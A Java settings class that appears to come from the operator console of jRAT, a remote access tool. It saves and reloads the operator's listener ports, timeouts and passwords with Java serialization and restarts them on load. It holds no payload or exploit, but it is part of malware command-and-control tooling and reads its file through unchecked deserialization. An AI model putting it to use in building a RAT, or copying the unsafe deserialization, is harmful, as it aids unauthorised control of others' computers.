package su.jrat.client.settings;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.net.BindException;
import java.util.ArrayList;
import java.util.List;

import javax.swing.JOptionPane;

import su.jrat.client.Globals;
import su.jrat.client.net.PortListener;

public class Sockets extends AbstractSettings implements Serializable {

	private static final long serialVersionUID = -4638162646507652405L;

	private static final Sockets instance = new Sockets();

	public static Sockets getGlobal() {
		return instance;
	}

	@Override
	@SuppressWarnings("unchecked")
	public void load() throws Exception {
		ObjectInputStream in = new ObjectInputStream(new FileInputStream(getFile()));
		List<SocketEntry> list = (ArrayList<SocketEntry>) in.readObject();

		for (SocketEntry socket : list) {
			socket.start();
		}

		in.close();
	}

	@Override
	public void save() throws Exception {
		ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(getFile()));
		List<SocketEntry> list = new ArrayList<SocketEntry>();

		for (int i = 0; i < PortListener.listeners.size(); i++) {
			PortListener connection = PortListener.listeners.get(i);
			SocketEntry save = new SocketEntry(connection.getName(), connection.getServer().getLocalPort(), connection.getTimeout(), connection.getPass());
			list.add(save);
		}

		out.writeObject(list);
		out.close();

	}

	public class SocketEntry implements Serializable {

		private static final long serialVersionUID = -2000514812654090252L;

		private String pass;
		private int timeout;
		private int port;
		private String name;

		public SocketEntry(String name, int port, int timeout, String pass) {
			this.name = name;
			this.port = port;
			this.timeout = timeout;
			this.pass = pass;
		}

		public String getPass() {
			return pass;
		}

		public int getTimeout() {
			return timeout;
		}

		public int getPort() {
			return port;
		}

		public String getName() {
			return name;
		}

		public void start() {
			try {
				PortListener connection = new PortListener(name, port, timeout, pass);
				connection.start();
			} catch (BindException e) {
				JOptionPane.showMessageDialog(null, "Port " + port + " is already in use", "jRAT", JOptionPane.ERROR_MESSAGE);
				e.printStackTrace();
			} catch (Exception e) {
				e.printStackTrace();
			}
		}

	}

	@Override
	public File getFile() {
		return new File(Globals.getSettingsDirectory(), ".sockets");
	}

}
